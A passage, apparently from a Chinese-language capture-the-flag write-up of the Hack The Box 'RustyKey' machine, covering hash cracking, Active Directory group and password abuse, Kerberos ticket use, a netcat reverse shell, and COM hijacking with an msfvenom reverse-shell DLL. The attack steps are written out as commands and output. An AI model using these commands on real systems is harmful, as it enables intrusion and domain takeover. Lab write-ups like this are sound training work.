class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fe1d8cde1b8428bffbfcd0aec0bd91dcbe9fadaec0bd91dcbea1257\u003c/span\u003e\n1127:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$3532f8aa3e91c748ce0a4a952c947d88\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fe9383de1b8428bffbfcd0aec0bd91dcbf15a4aec0bd91dcbf171c7\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对\u003ccode\u003eHash\u003c/code\u003e进行处理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e ../timeroast.txt | awk -F \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e \u003e hash.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ebeta\u003c/code\u003e版本\u003ccode\u003ehashcat\u003c/code\u003e进行破解\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eRusty88!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e寻找立足点\u003c/h2\u003e\n\u003cp\u003e破解得到\u003ccode\u003eRID\u003c/code\u003e是\u003ccode\u003e1125\u003c/code\u003e的计算机账户\u003c/p\u003e\n\u003cp\u003e也就是 \u003ccode\u003eIT-COMPUTER3.RUSTYKEY.HTB\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看该计算机账户的权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e给自己添加到\u003ccode\u003eHELPDESK\u003c/code\u003e组中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Timeroast bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb add groupMember HELPDESK \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改用户密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Timeroast bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n[+] Password changed successfully!\n➜  Timeroast bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password GG.ANDERSON \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n[+] Password changed successfully!\n➜  Timeroast bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password DD.ALI \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n[+] Password changed successfully!\n➜  Timeroast bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password BB.MORGAN \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里修改密码完毕后无法使用\u003ccode\u003eevil-winrm\u003c/code\u003e进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey evil-winrm -i 10.10.11.75 -u \u003cspan class=\"hljs-string\"\u003e'EE.REED'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e -r rustykey.htb         \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nError: An error of type ArgumentError happened, message is unknown type: 2061232681\n                                        \nError: Exiting with code 1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e随后我想到是因为需要使用\u003ccode\u003eKerberos\u003c/code\u003e认证\u003c/p\u003e\n\u003cp\u003e首先获取我打算获取\u003ccode\u003eBB.MORGAN\u003c/code\u003e的\u003ccode\u003eTGT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey getTGT.py rustykey.htb/\u003cspan class=\"hljs-string\"\u003e'BB.MORGAN'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e -dc-ip 10.10.11.75 \nge is slated \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026#x3C;81.\n  import pkg_resources  \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \nKerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是失败了\u003c/p\u003e\n\u003cp\u003e随后我从\u003ccode\u003eBloodHound\u003c/code\u003e的注意到，\u003ccode\u003eIT\u003c/code\u003e组和\u003ccode\u003eSUPPORT\u003c/code\u003e组都是属于被保护组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们再看\u003ccode\u003eIT-COMPUTER3\u003c/code\u003e的权限，属于\u003ccode\u003eHELPDESK\u003c/code\u003e组，该组拥有向\u003ccode\u003ePROTECTED OBJECT\u003c/code\u003e组添加成员的权限，也就是\u003ccode\u003eHELPDESK@RUSTYKEY.HTB\u003c/code\u003e 组的任何成员都有权向 \u003ccode\u003ePROTECTED OBJECTS@RUSTYKEY.HTB\u003c/code\u003e 组添加和移除成员。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们将\u003ccode\u003eIT\u003c/code\u003e组从中删除\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb remove groupMember \u003cspan class=\"hljs-string\"\u003e'PROTECTED OBJECTS'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'IT'\u003c/span\u003e\n[-] IT removed from PROTECTED OBJECTS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后获取\u003ccode\u003eEE.REED\u003c/code\u003e的\u003ccode\u003eTGT\u003c/code\u003e票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey getTGT.py rustykey.htb/\u003cspan class=\"hljs-string\"\u003e'BB.MORGAN'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e -dc-ip 10.10.11.75\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e BB.MORGAN.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用\u003ccode\u003eAI\u003c/code\u003e生成\u003ccode\u003e/etc/krb5.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/krb5.conf\n[libdefaults]\n    \u003cspan class=\"hljs-comment\"\u003e# 你的默认 Realm\u003c/span\u003e\n    default_realm = RUSTYKEY.HTB\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 强制使用 RC4 加密类型，以防万一（解决之前的 ETYPE_NOTSUPP 问题）\u003c/span\u003e\n    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac\n    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac\n\n    \u003cspan class=\"hljs-comment\"\u003e# 禁用 DNS 查询，直接使用下面 realms 中定义的 IP\u003c/span\u003e\n    dns_lookup_realm = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    dns_lookup_kdc = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\n[realms]\n    RUSTYKEY.HTB = {\n        \u003cspan class=\"hljs-comment\"\u003e# 直接指定 KDC 的 IP 地址\u003c/span\u003e\n        kdc = 10.10.11.75\n        admin_server = 10.10.11.75\n    }\n\n[domain_realm]\n    .rustykey.htb = RUSTYKEY.HTB\n    rustykey.htb = RUSTYKEY.HTB\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后使用\u003ccode\u003eevil-winrm\u003c/code\u003e进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey evil-winrm -i DC.rustykey.htb -r rustykey.htb -k BB.MORGAN.ccache \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: Useless cert/s provided, SSL is not enabled\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功获得立足点，读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\bb.morgan\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n4a0621b06ff45715f235cf71ce5acf08\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003eRecon\u003c/h3\u003e\n\u003cp\u003e重新导入一下\u003ccode\u003eBloodhound\u003c/code\u003e数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebloodhound-python -k -d \u003cspan class=\"hljs-string\"\u003e'rustykey.htb'\u003c/span\u003e -ns 10.10.11.75 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.rustykey.htb'\u003c/span\u003e --dns-tcp -u BB.MORGAN\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从\u003ccode\u003eWinpeas\u003c/code\u003e中信息收集发现\u003ccode\u003emm.turner\u003c/code\u003e 用户是我们之前无法直接修改密码的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e Home folders found\n    C:\\Users\\Administrator\n    C:\\Users\\All Users\n    C:\\Users\\bb.morgan : bb.morgan [Allow: AllAccess]\n    C:\\Users\\Default\n    C:\\Users\\Default User\n    C:\\Users\\ee.reed\n    C:\\Users\\mm.turner\n    C:\\Users\\Public\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eMM.TURNER\u003c/code\u003e属于\u003ccode\u003eDELEGATIONMANAGER\u003c/code\u003e组，难道要打\u003ccode\u003eRBCD\u003c/code\u003e？\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e家目录下还存在 \u003ccode\u003einternal.pdf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-diff\"\u003e*Evil-WinRM* PSC:\\Users\\bb.morgan\\Desktop\u003e ls\n\n    Directory: C:\\Users\\bb.morgan\\Desktop\n\nMode                LastWriteTime         Length Name\n\u003cspan class=\"hljs-comment\"\u003e----                -------------         ------ ----\u003c/span\u003e\n\u003cspan class=\"hljs-deletion\"\u003e-a----         6/4/2025   9:15 AM           1976 internal.pdf\u003c/span\u003e\n\u003cspan class=\"hljs-deletion\"\u003e-ar---        6/29/2025   1:47 PM             34 user.txt\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e内容是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eInternal Memo\nFrom: bb.morgan@rustykey.htb\nTo: support-team@rustykey.htb\nSubject: Support Group - Archiving Tool Access\nDate: Mon, 10 Mar 2025 14:35:18 +0100\nHey team,\nAs part of the new Support utilities rollout, extended access has been temporarily granted to allow\ntesting and troubleshooting of file archiving features across shared workstations.\nThis is mainly to \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e streamline ticket resolution related to extraction/compression issues reported\nby the Finance and IT teams. Some newer systems handle context menu actions differently, so\nregistry-level adjustments are expected during this phase.\nA few notes:\n- Please avoid making unrelated changes to system components \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e this access is active.\n- This permission change is logged and will be rolled back once the archiving utility is confirmed\nstable \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e all environments.\n- Let DevOps know \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e you encounter access errors or missing shell actions.\nThanks,\nBB Morgan\nIT Department\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e内部备忘录\n发件人：\u003ca href=\"mailto:bb.morgan@rustykey.htb\"\u003ebb.morgan@rustykey.htb\u003c/a\u003e\n收件人：\u003ca href=\"mailto:support-team@rustykey.htb\"\u003esupport-team@rustykey.htb\u003c/a\u003e\n主题：支持小组 - 归档工具访问权限\n日期：2025年3月10日星期一 14:35:18 +0100\n各位团队：\n作为新支持实用程序推出的一部分，我们已临时授予扩展访问权限，以便\n在共享工作站上测试和排除文件归档功能故障。\n这主要是为了帮助简化与财务和IT团队报告的提取/压缩问题相关的工单解决流程。某些较新的系统处理上下文菜单操作的方式有所不同，因此\n在此阶段预计会进行注册表级别的调整。\n几点注意事项：\u003c/p\u003e\n\u003cp\u003e在此访问权限有效期间，请避免对系统组件进行无关的更改。\u003c/p\u003e\n\u003cp\u003e此权限更改已记录，并在确认归档实用程序在所有环境中稳定运行后回滚。\u003c/p\u003e\n\u003cp\u003e如果您遇到访问错误或缺少shell操作，请告知DevOps。\n谢谢，\nBB Morgan\nIT 部门\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e纳尼纳尼？？提到了已临时授予扩展访问权限，进行注册表级别的调整，总感觉像是DLL劫持\u003c/p\u003e\n\u003cp\u003e并且收件人是：\u003ccode\u003esupport-team\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eGet EE.REED Shell ❌\u003c/h3\u003e\n\u003cp\u003e我们知道 \u003ccode\u003esupport\u003c/code\u003e 组中有\u003ccode\u003eEE.REED\u003c/code\u003e用户，我们可以直接进行修改密码的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是\u003ccode\u003esupport\u003c/code\u003e 组也在\u003ccode\u003eProtect\u003c/code\u003e组中，我们首先要先移出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=IT-COMPUTER3\\$.ccache\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb remove groupMember \u003cspan class=\"hljs-string\"\u003e'PROTECTED OBJECTS'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'SUPPORT'\u003c/span\u003e\n[-] SUPPORT removed from PROTECTED OBJECTS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改\u003ccode\u003eEE.REED\u003c/code\u003e的密码并获取\u003ccode\u003eTGT\u003c/code\u003e票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n\n[+] Password changed successfully!\n➜  RustyKey getTGT.py rustykey.htb/\u003cspan class=\"hljs-string\"\u003e'EE.REED'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e -dc-ip 10.10.11.75\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e EE.REED.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e导入票据并登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=EE.REED.ccache \n➜  RustyKey evil-winrm -i DC.rustykey.htb -r rustykey.htb -k EE.REED.ccache  \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: Useless cert/s provided, SSL is not enabled\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nError: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied\nSuccess\n\n                                        \nError: Exiting with code 1\nmalloc_consolidate(): unaligned fastbin chunk detected\n[1]    19408 IOT instruction  evil-winrm -i DC.rustykey.htb -r rustykey.htb -k EE.REED.ccache\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBOOOOOOOM！行不通\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/boom-4x.gif\" alt=\"boom-4x.gif\"\u003e\u003c/p\u003e\n\u003ch3\u003eGet EE.REED Shell\u003c/h3\u003e\n\u003cp\u003e我们无法使用\u003ccode\u003eevil-winrm\u003c/code\u003e来获得\u003ccode\u003eee.reed\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么我们可以尝试通过\u003ccode\u003eRunasCS\u003c/code\u003e来通过目标用户的显示凭据来运行\u003ccode\u003eCMD\u003c/code\u003e来获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eToolLink：\u003ca href=\"https://github.com/antonioCoco/RunasCs\"\u003ehttps://github.com/antonioCoco/RunasCs\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e首先修改 \u003ccode\u003eEE.REED\u003c/code\u003e的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=IT-COMPUTER3\\$.ccache \nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb add groupMember HELPDESK \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb remove groupMember \u003cspan class=\"hljs-string\"\u003e'PROTECTED OBJECTS'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'SUPPORT'\u003c/span\u003e\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次进入 \u003ccode\u003ebb.morgan\u003c/code\u003e 的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e成功执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e ./RunasCS.exe EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"cmd /c whoami\"\u003c/span\u003e\n[*] Warning: The logon \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e'EE.REED'\u003c/span\u003e is limited. Use the flag combination --bypass-uac and --logon-type \u003cspan class=\"hljs-string\"\u003e'8'\u003c/span\u003e to obtain a more privileged token.\n\nrustykey\\ee.reed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\tools\u003e upload ./nc.exe/nc64.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/RustyKey/nc.exe/nc64.exe to C:\\tools\\nc64.exe\n                                        \nData: 60360 bytes of 60360 bytes copied\n                                        \nInfo: Upload successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\tools\u003e upload ../../Tools/RunasCS/RunasCs.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/RustyKey/../../Tools/RunasCS/RunasCs.exe to C:\\tools\\RunasCs.exe\n                                        \nData: 68948 bytes of 68948 bytes copied\n                                        \nInfo: Upload successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./RunasCS.exe EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./nc64.exe 10.10.xx.xx 1234 -e cmd.exe\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功拿到 \u003ccode\u003eEE.REED\u003c/code\u003e 用户的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eCOM劫持\u003c/h3\u003e\n\u003cp\u003e拿到\u003ccode\u003eEE.REED\u003c/code\u003e用户后，我们知道我们拥有扩展访问权限，对注册表有一定权限\u003c/p\u003e\n\u003cp\u003e我们上传\u003ccode\u003eaccesschk\u003c/code\u003e 去查询\u003ccode\u003eEE.REED\u003c/code\u003e用户是否用拥有修改的权限\u003c/p\u003e\n\u003cp\u003e列出指定账户在该路径下拥有写（Write）权限的所有子键\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\tools\u003e ./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKLM\\SOFTWARE\n./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKLM\\SOFTWARE\n\nAccesschk v6.15 - Reports effective permissions \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e securable objects\nCopyright (C) 2006-2022 Mark Russinovich\nSysinternals - www.sysinternals.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果是没有\u003c/p\u003e\n\u003cp\u003e寻找\u003ccode\u003eCOM\u003c/code\u003e劫持\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\tools\u003e ./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKCR\\CLSID | findstr /I \u003cspan class=\"hljs-string\"\u003e\"RW\"\u003c/span\u003e\n./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKCR\\CLSID | findstr /I \u003cspan class=\"hljs-string\"\u003e\"RW\"\u003c/span\u003e\nRW HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能找到一条我们拥有权限的\u003c/p\u003e\n\u003cp\u003e我们再看底下有什么（AI：这个COM对象的描述是“7-Zip外壳扩展”。这立刻告诉我们，这个组件和文件资源管理器\u003ccode\u003eexplorer.exe\u003c/code\u003e高度相关。当你在文件上右键点击时，菜单中出现的“7-Zip”选项就是由这个DLL提供的。当外壳需要显示7-Zip右键菜单时，它会加载 \u003ccode\u003eC:\\Program Files\\7-Zip\\7-zip.dll\u003c/code\u003e 这个文件。这就是我们要替换掉的路径。）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\nreg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n    (Default)    REG_SZ    7-Zip Shell Extension\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\n    (Default)    REG_SZ    C:\\Program Files\\7-Zip\\7-zip.dll\n    ThreadingModel    REG_SZ    Apartment\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e生成反弹\u003ccode\u003eshell\u003c/code\u003e的\u003ccode\u003eDLL\u003c/code\u003e 并上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f dll -o rev.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eMSF\u003c/code\u003e 监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(multi/handler) \u003e run\n[*] Started reverse TCP handler on 10.10.xxxxxx:4444 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们直接替换掉\u003ccode\u003eInprocServer32\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg add \u003cspan 